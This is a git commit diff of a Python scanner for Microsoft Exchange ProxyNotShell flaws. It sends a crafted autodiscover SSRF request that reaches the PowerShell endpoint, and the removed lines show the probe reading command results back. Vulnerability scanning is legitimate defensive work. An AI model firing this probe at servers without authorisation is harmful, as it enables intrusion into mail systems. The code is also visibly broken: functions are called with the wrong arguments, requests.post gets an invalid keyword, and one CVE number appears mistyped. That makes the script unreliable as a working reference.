80cd5f9c121ef6be18267e269258f03564f28e05
ZephrFish <ZephrFish@users.noreply.github.com>
2022-10-08 00:00:55 +0100

    Update NotProxyShell.py

--- NotProxyShell.py
+++ NotProxyShell.py
@@ -23,25 +23,26 @@ def banner():
     | \ | | ___ | |_|  _ \ _ __ _____  ___   _/ ___|| |__   ___| | |
     |  \| |/ _ \| __| |_) | '__/ _ \ \/ / | | \___ \| '_ \ / _ \ | |
     | |\  | (_) | |_|  __/| | | (_) >  <| |_| |___) | | | |  __/ | |
-    |_| \_|\___/ \__|_|   |_|  \___/_/\_\\__, |____/|_| |_|\___|_|_|
+    |_| \_|\___/ \__|_|   |_|  \___/_/\_\\__,  |____/|_| |_|\___|_|_|
                                          |___/ 
     Scanner by ZephrFish                                                                         
     ''')
     print('''
     CVE-2022-40140 & CVE-2022-41082 Scanner
     Usage:
-            Check Hosts: python3 NotProxy.py -u target_host
-            Check List: python3 NotProxy.py -f file.txt
+            Check Hosts: python3 NotProxyShell.py -u target_host -d domain.com -e email@domain.com
+            Check List: python3 NotProxyShell.py -f file.txt -d domain.com -e email@domain.com
         ''')
 
 # Initial variables
-
-outfile = None
+#outfile = None
 targethost = 'example.com'
 email = 'example@example.com'
 
 
-def scanner(args):
+banner()
+
+def scanner(args,targethost,email,domain):
     targethost = args.targethost
     domain = args.targetdomain
     email = args.targetemail
@@ -56,63 +57,40 @@ def scanner(args):
         try:
             response = requests.post(url=attack_url, verify=False, timeout=5, proxy=proxy)
             if response.status_code == 200 and 'Powershell' in response.text:
-                prGreen("[+] Target {} Vulnerable".format(targethost))
-            elif response.status_code == 503 and '' in response.text:
-                prRed("[!] Target {} is not Vulnerable".format(targethost))
+                prGreen(f"[+] Target {targethost} Vulnerable")
+            elif response.status_code != 200 and 'X-FEServer' in response.text:
+                prYellow(f"[!] Target {targethost} might be Vulnerable")
+            elif response.status_code == 503:
+                prRed(f"[-] Target {targethost} is not Vulnerable, Mitigation Detected")
         
         except Exception as e:
-            prYellow('url exception {0}'.format(targethost))
+            prYellow(f'url exception {targethost}')
 
 
 
 
 
 def main(args):
-    targethostfile = args.targethostfile
+    target = args.targethost
     if targethost == None:
+        targethostfile = args.targethostfile
         with open(targethostfile.rstrip(), 'r') as f:
              for target in f:
                 scanner(target)
     else: 
-        target = targethost 
-        attack_url = target + f'/autodiscover/autodiscover.json?{email}/owa/&Email=autodiscover/autodiscover.json?b@{domain}&Protocol=TESTING&Protocol=PowerShell'
-        regex=re.compile('^http://|^https://')
-        if re.match(regex, target):
-            try:
-                response = requests.post(url=attack_url, verify=False, timeout=5, proxy=proxy)
-                if response.status_code == 200 and 'Powershell' in response.text:
-            
-            except: 
-                pass
-
-
-
-
-       try:
-        response = requests.post(url=attack_url, verify=False, timeout=5, proxy=proxy)
-        if response.status_code == 200 and 'commandResult' in response.text:
-            default = json.loads(response.text)
-            display = default['commandResult']
-            prGreen("[+] Target {} Vulnerable".format(targethost))
-            print('[+] Response:{0}'.format(display))
-        else:
-            prRed("[-] Target {} Not Vulnerable".format(targethost))
-    except Exception as e:
-        prYellow('url exception {0}'.format(targethost))
-    banner()
+        target = args.targethost 
+        scanner(target)
 
 
 
 
 if __name__ == '__main__':
-
-	parser = argparse.ArgumentParser()
-
-	basic_args = parser.add_argument_group(title='Basic Options')
-	basic_args.add_argument('-u', '--targethost', default=None, required=False, help='Single Target host e.g zsec.uk')
-	basic_args.add_argument('-f', '--targethostfile', default=None, required=False, help='File with targets, one per line')
-    basic_args.add_argument('-e', '--email', default=None, required=False, help='Known email of org')
-    basic_args.add_argument('-o', '--outfile', default=None, required=False, help='Output file for log')
+    
+    parser = argparse.ArgumentParser()
+    parser.add_argument('-u', '--targethost', default=None, required=False, help='Single Target host e.g zsec.uk')
+    parser.add_argument('-f', '--targethostfile', default=None, required=False, help='File with targets, one per line')
+    parser.add_argument('-e', '--email', default=None, required=False, help='Known email of org')
+    parser.add_argument('-d', '--targetdomain', default=None, required=False, help='Known domain of the target org')
     
     args = parser.parse_known_args()
     
